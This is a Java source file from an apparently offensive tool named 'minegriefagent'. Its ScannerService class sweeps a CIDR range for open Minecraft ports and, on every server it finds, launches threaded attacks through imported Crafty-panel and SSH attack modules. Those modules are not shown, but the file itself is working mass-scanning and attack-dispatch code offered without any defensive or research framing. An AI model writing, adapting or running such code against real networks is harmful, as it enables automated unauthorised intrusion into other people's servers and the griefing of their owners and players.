package com.chebuya.minegriefagent.scanner;

import java.util.ArrayList;

import static com.chebuya.minegriefagent.modules.Crafty.attackCrafty;
import static com.chebuya.minegriefagent.modules.SSH.attackSSH;
import static com.chebuya.minegriefagent.util.Logging.LOGGER;
import static com.chebuya.minegriefagent.util.Network.expandCIDR;
import static com.chebuya.minegriefagent.util.Network.isPortOpen;

public class ScannerService implements Runnable {
    private final String cidr;
    private final int MINECRAFT_PORT = 25565;

    public ScannerService(String cidr) {
        this.cidr = cidr;
    }

    @Override
    public void run() {
        LOGGER.info("target CIDR: " + cidr);
        ArrayList<String> targets;
        try {
            targets = expandCIDR(cidr);
        } catch (Exception e) {
            LOGGER.warning("error processing CIDR: " + e.getMessage());
            return;
        }

        for (String target: targets) {
            if (!isPortOpen(target, MINECRAFT_PORT)) {
                continue;
            }
            LOGGER.info("discovered a minecraft server on " + target + ":" + MINECRAFT_PORT);

            new Thread(() -> attackTarget(target)).start();
        }

        LOGGER.info("scanned CIDR: " + cidr);
    }

    private void attackTarget(String target) {
        if (attackCrafty(target)) {
            return;
        }

        if (attackSSH(target)) {
            return;
        }
    }


}
